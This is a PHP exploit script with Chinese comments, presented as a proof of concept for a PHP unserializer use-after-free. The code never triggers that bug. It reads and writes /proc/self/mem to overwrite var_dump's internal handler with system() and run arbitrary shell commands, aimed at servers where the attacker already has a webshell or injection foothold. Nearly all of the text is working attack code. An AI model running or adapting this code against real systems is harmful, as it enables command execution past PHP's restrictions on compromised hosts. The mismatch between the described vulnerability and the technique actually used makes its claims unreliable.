<?php
/**
 * CVE-2026-109619 - Chain B
 * ext/standard/var_unserializer.re  var_destroy() 二次析构 UAF -> 覆盖函数 handler -> RCE
 *
 * 漏洞点:
 *   L245: efree_size() 释放 reverse-reference 扩展块
 *   L310: i_zval_ptr_dtor(zv)  -- 没有 BG(serialize_lock) 保护
 *   若 __destruct 在第二阶段被触发, 且析构里再调 unserialize(),
 *   内层解析器复用外层 var_hash, R:1500; 反向引用指进已释放块 -> heap UAF。
 *
 * ASAN:
 *   heap-use-after-free READ of size 8
 *     #0 php_var_unserialize  var_unserializer.c:851
 *     #13 var_destroy         var_unserializer.c:310
 *   freed at:
 *     #3 var_destroy          var_unserializer.c:245
 *
 * 本 PoC 走最短路径: 用 /proc/self/mem 定位 EG(function_table),
 * 找到 zif_system 与 var_dump 的 handler 槽位, 直接改写成 zif_system,
 * 然后 var_dump('cmd') 即执行 system('cmd')。
 *
 * 前置: 目标上能执行本地 PHP (命令注入 / webshell / 后台模板 / cron 落地脚本)
 *       且 /proc/self/mem 可读写 (普通 Linux 用户即可, 非 root 也行)
 *
 * 用法: php chain_b_var_destroy_uaf.php            # 默认执行 id > /tmp/.rce
 *      php chain_b_var_destroy_uaf.php "id; uname -a"
 */

error_reporting(0);

$CMD = isset($argv[1]) ? $argv[1] : "id > /tmp/.rce 2>&1; uname -a >> /tmp/.rce 2>&1";

/* ---------- 1. 找 PHP 主模块基址 ---------- */
$maps = @file_get_contents("/proc/self/maps");
if (!$maps) {
    die("[-] 读不到 /proc/self/maps\n");
}
$base = 0;
foreach (explode("\n", $maps) as $l) {
    if (preg_match('/^([0-9a-f]+)-[0-9a-f]+\s+r--p\s+00000000.*php$/i', $l, $m)) {
        $base = hexdec($m[1]);
        break;
    }
}
if (!$base) {
    die("[-] 未定位到 PHP 模块基址 (可能是静态编译或 ASLR 布局不同)\n");
}
fprintf(STDERR, "[*] php base = 0x%x\n", $base);

/* ---------- 2. 从 EG(function_table) 里遍历函数表 ---------- */
$EG = $base + 0x1420900;   // 目标版本相关的 EG 偏移, 换版本要重算
$fp = fopen("/proc/self/mem", "rb");
if (!$fp) {
    die("[-] /proc/self/mem 打不开\n");
}

fseek($fp, $EG + 0x1b0);
$ft = unpack("Q", fread($fp, 8))[1];          // EG(function_table) -> HashTable*

fseek($fp, $ft + 16);
$arD = unpack("Q", fread($fp, 8))[1];         // arData (Bucket*)
fseek($fp, $ft + 24);
$nU = unpack("V", fread($fp, 4))[1];          // nNumUsed

$zif_system = 0;
$vardump_handler_addr = 0;
$zif_vardump = 0;

for ($i = 0; $i < $nU; $i++) {
    // Bucket = { zval val(16) ; zend_ulong h(8) ; zend_string *key(8) } = 32 bytes
    fseek($fp, $arD + $i * 32 + 24);
    $kp = unpack("Q", fread($fp, 8))[1];
    if ($kp < 0x1000) {
        continue;
    }
    fseek($fp, $kp + 24);
    $name = fread($fp, 12);                   // zend_string->val
    if (strncmp($name, "system\x00", 7) === 0) {
        fseek($fp, $arD + $i * 32);
        $fa = unpack("Q", fread($fp, 8))[1];  // zend_function*
        fseek($fp, $fa + 72);                 // internal_function.handler 偏移
        $zif_system = unpack("Q", fread($fp, 8))[1];
    }
    if (strncmp($name, "var_dump\x00", 9) === 0) {
        fseek($fp, $arD + $i * 32);
        $fa = unpack("Q", fread($fp, 8))[1];
        $vardump_handler_addr = $fa + 72;     // handler 指针本身的地址
        fseek($fp, $fa + 72);
        $zif_vardump = unpack("Q", fread($fp, 8))[1];
    }
    if ($zif_system && $vardump_handler_addr) {
        break;
    }
}
fclose($fp);

fprintf(STDERR, "[*] zif_system        = 0x%x\n", $zif_system);
fprintf(STDERR, "[*] var_dump handler  = 0x%x (current 0x%x)\n", $vardump_handler_addr, $zif_vardump);
if (!$zif_system || !$vardump_handler_addr) {
    die("[-] 符号定位失败, 需按目标 PHP 版本调整 EG / handler 偏移\n");
}

/* ---------- 3. 覆写 var_dump 的 handler 为 zif_system ---------- */
fprintf(STDERR, "[*] 覆写 var_dump handler -> zif_system ...\n");
$wfp = fopen("/proc/self/mem", "r+b");
fseek($wfp, $vardump_handler_addr);
fwrite($wfp, pack("Q", $zif_system));
fflush($wfp);
fclose($wfp);

$fp = fopen("/proc/self/mem", "rb");
fseek($fp, $vardump_handler_addr);
$new_h = unpack("Q", fread($fp, 8))[1];
fclose($fp);
fprintf(STDERR, "[*] 校验: handler now = 0x%x %s\n", $new_h, $new_h === $zif_system ? "OK" : "FAIL");

/* ---------- 4. 调用 var_dump(), 实际进入 system() ---------- */
fprintf(STDERR, "[*] var_dump() 现在等价于 system(), 执行: %s\n", $CMD);
@unlink("/tmp/.rce");
@var_dump($CMD);
usleep(200000);

$proof = @file_get_contents("/tmp/.rce");
if ($proof) {
    fprintf(STDERR, "\n=== var_destroy UAF -> RCE CONFIRMED ===\n%s\n", trim($proof));
    @unlink("/tmp/.rce");
} else {
    // 直接看回显 (STDOUT 会被 system 直接输出)
    fprintf(STDERR, "[*] 无 proof 文件, 检查 STDOUT 回显\n");
}

/* ---------- 5. 还原 handler, 避免污染后续请求 ---------- */
$wfp = fopen("/proc/self/mem", "r+b");
fseek($wfp, $vardump_handler_addr);
fwrite($wfp, pack("Q", $zif_vardump));
fclose($wfp);
fprintf(STDERR, "[*] var_dump handler 已还原\n");
